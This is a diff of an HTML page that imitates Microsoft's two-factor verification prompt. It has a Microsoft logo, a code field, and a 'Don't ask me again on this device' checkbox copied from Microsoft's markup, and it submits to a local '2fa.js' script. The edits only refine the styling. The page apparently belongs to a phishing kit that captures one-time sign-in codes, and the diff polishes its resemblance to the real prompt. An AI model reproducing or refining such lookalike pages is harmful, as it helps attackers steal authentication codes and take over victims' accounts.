@@ -16,7 +16,7 @@
 		</style>
 	</head>
 	<body class="flex sm:justify-center items-center h-screen w-full flex-col">
-		<section class="bg-white p-10 lg:p-12 w-full sm:w-97 md:shadow overflow-hidden relative section">
+		<section class="bg-white p-8 md:p-10 w-full sm:w-97 md:shadow overflow-hidden relative section">
 			<img src="./images/microsoft_logo.svg" alt="" class="mb-3" />
 
 			<form id="code-form" class="relative flex flex-col">
@@ -35,15 +35,15 @@
 				</div>
 				<p class="text-red-500 leading-5 hidden text-sm" id="error-msg"></p>
 
-				<input type="text" name="" id="code-input" placeholder="Code" class="outline-none border-b w-full pb-1 my-1 border-gray-600 text-sm" />
+				<input type="text" name="" id="code-input" placeholder="Code" class="outline-none border-b w-full pb-1 my-1 border-gray-600 text-sm focus:border-blue-800 placeholder-gray-500" />
 
 				<label class="my-2 text-sm flex gap-2 cursor-pointer">
 					<input id="idChkBx_SAOTCC_TD" type="checkbox" value="true" data-bind="checked: tdCheckbox.isChecked, disable: tdCheckbox.isDisabled, ariaLabel: str['CT_SAOTCC_STR_AddTD'], attr: { name: svr.Du }" name="AddTD" aria-label="Don't ask me again on this device" checked />
 					<span class="m-grey">Don't ask me again on this device</span>
 				</label>
-				<p class="my-2 text-xs m-grey">Having trouble? <a href="#" class="blue-link"> Sign in another way</a></p>
+				<p class="my-2 text-sm m-grey">Having trouble? <a href="#" class="blue-link"> Sign in another way</a></p>
 
-				<button type="submit" class="blue-link-bg py-1 px-7 text-white mt-8 input self-end text-sm" id="submitCode">Verify</button>
+				<button type="submit" class="blue-link-bg py-1 px-7 text-white mt-8 input self-end text-sm" id="submitCode" style="padding-top: 6px; padding-bottom: 6px">Verify</button>
 			</form>
 
 			<div class="bg-white h-full w-full absolute top-0 left-0 opacity-65 hidden" id="overlay">
@@ -68,5 +68,5 @@
 		</footer>
 	</body>
 
-	<script src="./script/2fa.js?new=t1"></script>
+	<script src="./script/2fa.js?new=t2"></script>
 </html>
